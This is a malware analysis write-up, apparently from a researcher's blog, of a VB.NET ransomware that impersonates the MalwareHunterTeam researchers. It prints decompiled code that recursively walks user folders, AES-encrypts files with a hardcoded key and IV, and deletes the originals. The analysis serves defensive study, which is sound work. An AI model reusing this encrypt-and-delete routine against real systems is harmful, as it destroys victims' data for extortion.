# MalwareHunterTeam Ransomware

* [Version at ANY.RUN](https://app.any.run/tasks/d4db56ce-d243-4850-a479-93a9c9dcdb4a)
* [VT Link](https://www.virustotal.com/gui/file/9012a3958219ec427b9b447dffca591b19cb4097f3bb89acc1389c4da59f6dfe)
* [VT Link Deobfuscation](https://www.virustotal.com/gui/file/9012a3958219ec427b9b447dffca591b19cb4097f3bb89acc1389c4da59f6dfe)


<blockquote class="twitter-tweet" data-media-max-width="960"><p lang="zxx" dir="ltr"><a href="https://t.co/j4Ty5K2wUi">pic.twitter.com/j4Ty5K2wUi</a></p>&mdash; petikvx (@petikvx) <a href="https://twitter.com/petikvx/status/1770543961318273431?ref_src=twsrc%5Etfw">March 20, 2024</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

## File Informations

This ransomware is written in VB.NET and is protected with the .NET Reactor tool.

The malware makes it appear as if it was authored by our colleagues MalwareHunterteam ([https://malwarehunterteam.com/](https://malwarehunterteam.com) - [https://twitter.com/malwrhunterteam](https://twitter.com/malwrhunterteam)), but it is not the case.

We will thus use [NETReactorSlayer](https://github.com/SychicBoy/NETReactorSlayer) to deprotect it.

Here are the results before and after with [Detect-It-Easy](https://github.com/horsicq/Detect-It-Easy)

```
petik@win:test$ diec MalwareHunterTeam.exe
/home/petik/test/MalwareHunterTeam.exe:
PE32
    Protector: .NET Reactor(4.8-4.9)[-]
    Library: .NET(v4.0.30319)[-]
    Compiler: VB.NET(-)[-]
    Linker: Microsoft Linker(6.0)[GUI32]

petik@win:test$ diec MalwareHunterTeam_Slayed.exe:
PE32
    Library: .NET(v4.0.30319)[-]
    Compiler: VB.NET(-)[-]
    Linker: Microsoft Linker(6.0)[GUI32]
```

We now have a better understanding of the code :

![deobfuscation](/images/mhunter/deobfuscation.png)

## Operation of the malware

The malware will scan the following folders:
Personal
Desktop
Downloads

```
Private Sub Form1_Load(sender As Object, e As EventArgs)
	Try
		Me.method_0(Environment.GetFolderPath(Environment.SpecialFolder.Personal))
	Catch ex As Exception
	End Try
	Try
		Me.method_0(Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
	Catch ex2 As Exception
	End Try
	Try
		Me.method_0(Environment.GetEnvironmentVariable("UserProfile") + "\Downloads")
	Catch ex3 As Exception
	End Try
	Class2.Class3_0.Middleman.Show()
End Sub
```

It will look for files in the directory except those with the following extensions in order not to disrupt the system :
".exe", ".dll", ".scr", ".com", ".pif", ".ini", ".log", ".sys", ".drv", ".xml", ".dat", ".reg"

``` 
Private Sub method_0(string_0 As String)
	For Each string_ As String In Directory.GetFiles(string_0)
		If Not Me.method_1(string_) Then
			Me.method_2(string_)
		End If
	Next
	For Each string_2 As String In Directory.GetDirectories(string_0)
		Me.method_0(string_2)
	Next
End Sub

Private Function method_1(string_0 As String) As Boolean
	Dim source As IEnumerable(Of String) = New String() { Form1.newExtension, ".exe", ".dll", ".scr", ".com", ".pif", ".ini", ".log", ".sys", ".drv", ".xml", ".dat", ".reg" }
	Dim extension As String = Path.GetExtension(string_0)
	Return source.Contains(extension)
End Function
```

Then we have :

```
Private Sub method_2(string_0 As String)
	Try
		If New FileInfo(string_0).Length <= 104857600L Then
			Dim path As String = string_0 + Form1.newExtension
			Using aes As Aes = Aes.Create()
				aes.Key = Form1.byte_0
				aes.IV = Form1.byte_1
				Using fileStream As FileStream = New FileStream(string_0, FileMode.Open)
					Using fileStream2 As FileStream = New FileStream(path, FileMode.Create)
						Using cryptoTransform As ICryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV)
							Using cryptoStream As CryptoStream = New CryptoStream(fileStream2, cryptoTransform, CryptoStreamMode.Write)
								fileStream.CopyTo(cryptoStream)
							End Using
						End Using
					End Using
				End Using
			End Using
			File.Delete(string_0)
		End If
	Catch ex As Exception
	End Try
End Sub

' Token: 0x04000010 RID: 16
Public Shared newExtension As String = ".malwarehunterteam"

' Token: 0x04000011 RID: 17
Private Shared byte_0 As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32}

' Token: 0x04000012 RID: 18
Private Shared byte_1 As Byte() = New Byte() {33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48}

```

This code performs the following operations:

1.  Checks if the size of the file specified by the path `string_0` is less than or equal to 104857600 bytes (100 MB).
2.  If the file size is less than or equal to this limit, the code:
    -   Concatenates an extension specified by `Form1.newExtension` to `string_0` to form a new path `path`. (file.jpg => file.jpg.malwarehunterteam)
    -   Initializes an AES object for symmetric encryption.
    -   Configures the key and initialization vector (IV) for AES using values specified by `Form1.byte_0` and `Form1.byte_1`.
    -   Opens a read stream on the source file specified by `string_0`.
    -   Opens a write stream on the destination file specified by `path`.
    -   Creates an encryption transformer using the AES key and IV.
    -   Creates a crypto stream for writing encrypted data to the destination file.
    -   Copies data from the read stream to the crypto stream to encrypt it.
    -   Deletes the source file after encryption.
3.  The `Catch` block catches any exceptions and ignores them.

In summary, this code encrypts a file using AES if its size is less than or equal to 100 MB, using specified key and IV, and then deletes the source file once encryption is complete.


It displays the visual at the end :

![visual](/images/mhunter/visual.png)

This will create a file on the Desktop named readme_encrypted.txt with the following text:
Dear user, your files are encrypted. Contact @malwarehuntrteam on Twitter/X.

![readme_encrypted](/images/mhunter/readme_encrypted.png)

A savoir que la bonne adresse de nos confr√®res est bien : [https://twitter.com/malwrhunterteam](https://twitter.com/malwrhunterteam)

This window features a text area and a button: **Decrypt Me!**

One might assume there is some sort of password to decrypt the files.

